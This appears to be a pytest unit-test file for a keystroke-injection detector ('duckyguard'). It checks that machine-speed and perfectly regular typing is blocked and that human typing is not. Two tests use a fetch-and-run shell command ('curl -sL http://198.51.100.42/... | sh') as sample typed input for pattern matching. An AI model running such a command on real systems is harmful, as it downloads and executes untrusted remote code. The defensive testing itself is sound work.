"""Detector unit tests: injector timings are blocked, human timings are not, every block explains itself."""

import random

import pytest

from duckyguard.detector import KeyEvent, KeystrokeAnomalyDetector


def feed(det, intervals, text="echo hello world this is text", hold=None, start=1000.0, injected=False):
    """Feed keys with the given inter-key intervals; return (blocked_at_index, verdict)."""
    t = start
    prev_hold = None
    for i, gap in enumerate([0.0] + list(intervals)):
        t += gap
        ch = text[i % len(text)]
        v = det.observe(KeyEvent(timestamp=t, char=ch, hold_time=prev_hold, injected=injected, source_pid=99 if injected else 0))
        if v.block:
            return i + 1, v
        prev_hold = hold
    return None, v


def test_rubber_ducky_12ms_blocked_within_8_keys_on_timing_alone():
    # No key-up information (hold unknown): the rate and regularity rules still decide.
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.012] * 40, hold=None)
    assert n is not None and n <= 8
    assert v.kind == "machine"
    assert v.reasons and "keys/s" in v.reasons[0]
    assert "blocked" in v.explanation


def test_rubber_ducky_12ms_with_instant_releases_blocked_at_5th_key():
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.012] * 40, hold=0.003)
    assert n == 5 and v.features["rule"].startswith("J")
    assert v.kind == "machine"
    assert "blocked" in v.explanation


def test_claims_audit_gap_even_30ms_no_pattern_trusted_device_is_blocked():
    """Regression for the 2026-10-26 audit: 30 ms even spacing, no new USB device, no shell pattern."""
    det = KeystrokeAnomalyDetector(usb_age_callback=lambda: None)
    n, v = feed(det, [0.030] * 40, text="hello world this is a plain sentence typed by a script")
    assert n is not None and n <= 8
    assert v.features["pattern"] is None
    assert v.features["new_keyboard_age_s"] is None


@pytest.mark.parametrize("ms", [8, 15, 20, 25, 30, 40, 50, 60])
def test_even_timings_up_to_60ms_blocked(ms):
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [ms / 1000.0] * 40)
    assert n is not None and n <= 12, f"{ms} ms even payload not blocked"


def test_slow_but_perfectly_regular_payload_blocked_by_20_keys():
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.100] * 40)
    assert n == 20
    assert v.features["rule"].startswith("D")


def test_human_average_typist_not_blocked():
    rng = random.Random(1)
    det = KeystrokeAnomalyDetector()
    gaps = [rng.lognormvariate(-1.5, 0.5) for _ in range(300)]  # mean ~250 ms
    n, v = feed(det, gaps, hold=0.09)
    assert n is None


def test_human_fast_typist_not_blocked():
    rng = random.Random(2)
    det = KeystrokeAnomalyDetector()
    for _ in range(50):
        det.reset()
        gaps = [rng.lognormvariate(-2.4, 0.4) for _ in range(120)]  # mean ~95 ms, CV ~0.4
        n, v = feed(det, gaps, hold=0.08)
        assert n is None, v.reasons


def test_key_mashing_with_high_variance_not_blocked():
    rng = random.Random(3)
    det = KeystrokeAnomalyDetector()
    for _ in range(50):
        det.reset()
        gaps = [rng.uniform(0.02, 0.09) for _ in range(16)]
        n, v = feed(det, gaps, text="asdfjkl;asdfjkl;")
        assert n is None, (v.reasons, v.features)


def test_software_typed_keys_are_not_blocked_but_are_labelled():
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.005] * 100, injected=True)
    assert n is None
    assert v.kind == "software"
    assert det.software_keys == 101


def test_software_keys_scored_in_test_mode():
    det = KeystrokeAnomalyDetector(test_mode=True)
    n, v = feed(det, [0.012] * 40, injected=True)
    assert n is not None


def test_auto_repeat_and_modifiers_ignored():
    det = KeystrokeAnomalyDetector()
    t = 0.0
    for i in range(200):
        v = det.observe(KeyEvent(timestamp=t, char="a", repeat=(i > 0)))
        assert not v.block
        t += 0.03
    for i in range(50):
        v = det.observe(KeyEvent(timestamp=t, char="[shift]", modifier=True))
        assert v.kind == "ignored"
        t += 0.005


def test_pause_starts_new_burst():
    det = KeystrokeAnomalyDetector()
    # 5 fast keys, a one-second pause, then 5 fast keys: never 6 in one burst
    t = 0.0
    for rep in range(6):
        for _ in range(5):
            v = det.observe(KeyEvent(timestamp=t, char="x"))
            assert not v.block
            t += 0.012
        t += 1.0


def test_untrusted_keyboard_lowers_threshold_but_needs_8_keys():
    det = KeystrokeAnomalyDetector(usb_age_callback=lambda: 2.0)
    n, v = feed(det, [0.050] * 30, text="curl -sL http://198.51.100.42/x | sh")
    assert n is not None
    assert any("keyboard" in r for r in v.reasons)


def test_timestamp_zero_is_a_valid_timestamp():
    det = KeystrokeAnomalyDetector()
    v = det.observe(KeyEvent(timestamp=0.0, char="a"))
    assert v.kind == "buffering"
    assert det.total_keys == 1


def test_clock_going_backwards_does_not_crash_or_block():
    det = KeystrokeAnomalyDetector()
    t = 100.0
    for i in range(30):
        v = det.observe(KeyEvent(timestamp=t, char="a", hold_time=0.1))
        t -= 0.5 if i % 7 == 0 else -0.2
    assert not v.block


def test_pattern_matches_across_long_text_window():
    """v1 bug: the 13-char curl pattern could never match inside a 12-key window."""
    det = KeystrokeAnomalyDetector()
    text = 'curl -sL http://198.51.100.42/p.sh | sh\n'
    t = 0.0
    seen_pattern = False
    for ch in text:
        v = det.observe(KeyEvent(timestamp=t, char=ch))
        t += 0.2   # slow enough never to block on timing alone
        if v.features.get("pattern"):
            seen_pattern = True
    assert seen_pattern


def test_record_keystroke_compat_shim():
    det = KeystrokeAnomalyDetector()
    for i in range(20):
        blocked, score, metrics = det.record_keystroke("a", timestamp=i * 0.01)
    assert blocked is True
    assert "reasons" in metrics


def test_rubber_ducky_default_blocked_at_6th_key_on_timing_alone():
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.008] * 40, hold=None)
    assert n == 6 and v.features["rule"].startswith("G")


def test_rubber_ducky_default_with_instant_releases_blocked_at_5th_key():
    det = KeystrokeAnomalyDetector()
    n, v = feed(det, [0.008] * 40, hold=0.002)
    assert n == 5 and v.features["rule"].startswith("J")


def test_new_keyboard_plus_fast_even_burst_blocks_at_6_keys():
    det = KeystrokeAnomalyDetector(usb_age_callback=lambda: 2.0)
    n, v = feed(det, [0.040] * 30, text="hello world this is plain")
    assert n == 6 and v.features["rule"].startswith("H")


def test_same_burst_without_new_keyboard_not_blocked_that_early():
    det = KeystrokeAnomalyDetector(usb_age_callback=lambda: None)
    n, v = feed(det, [0.040] * 30, text="hello world this is plain")
    assert n is not None and n >= 8


def test_blocked_burst_stays_blocked_when_attacker_slows_down():
    det = KeystrokeAnomalyDetector()
    n, _ = feed(det, [0.010] * 20)
    assert n is not None
    t = 2000.0
    det2 = KeystrokeAnomalyDetector()
    for i in range(8):
        t += 0.010
        det2.observe(KeyEvent(timestamp=t, char="a"))
    # attacker now types erratically at human-ish gaps but never pauses > 350 ms
    for g in (0.19, 0.31, 0.12, 0.28, 0.22):
        t += g
        v = det2.observe(KeyEvent(timestamp=t, char="b"))
        assert v.block and v.features["rule"].startswith("S")
    # a real pause ends the lock
    t += 1.0
    assert not det2.observe(KeyEvent(timestamp=t, char="c")).block


def test_timestamp_zero_is_a_real_timestamp():
    det = KeystrokeAnomalyDetector()
    blocked, _score, m = det.record_keystroke("a", 0.0)
    assert not blocked
    assert det._last_ts == 0.0


def test_selftest_passes(capsys):
    from duckyguard.selftest import run
    assert run() == 0
